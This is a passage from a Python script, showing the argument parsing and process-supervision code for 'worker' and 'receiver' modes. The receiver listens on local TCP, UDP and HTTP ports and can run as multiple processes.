                args=(args.host,args.tcp_port,args.udp_port,args.http_port))
                for _ in range(args.workers)]
    def stop(signum, frame):
        raise SystemExit(0)
    signal.signal(signal.SIGTERM, stop)
    try:
        for child in children:
            child.start()
        while True:
            for child in children:
                child.join(timeout=.2)
                if child.exitcode is not None:
                    raise RuntimeError('Receiver worker exited: %s' % child.exitcode)
    finally:
        for child in children:
            if child.is_alive():
                child.terminate()
        for child in children:
            if child.pid is not None:
                child.join(timeout=5)
                if child.is_alive():
                    child.kill()
                    child.join()


def main():
    p = argparse.ArgumentParser()
    sub = p.add_subparsers(dest='command',required=True)
    sub.add_parser('worker')
    r = sub.add_parser('receiver')
    r.add_argument('--host',default='127.0.0.1')
    r.add_argument('--tcp-port',type=int,default=9001)
    r.add_argument('--udp-port',type=int,default=9002)
    r.add_argument('--http-port',type=int,default=8088)
    r.add_argument('--workers',type=int,default=1,help='Independent receiver processes (Linux SO_REUSEPORT)')
    args = p.parse_args()
    if args.command=='receiver' and not 1 <= args.workers <= 64:
        p.error('--workers must be between 1 and 64')
    try:
        if args.command=='receiver' and args.workers > 1:
            parallel_receiver(args)
        else:
            asyncio.run(worker() if args.command=='worker' else receiver(args.host,args.tcp_port,args.udp_port,args.http_port))
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    main()
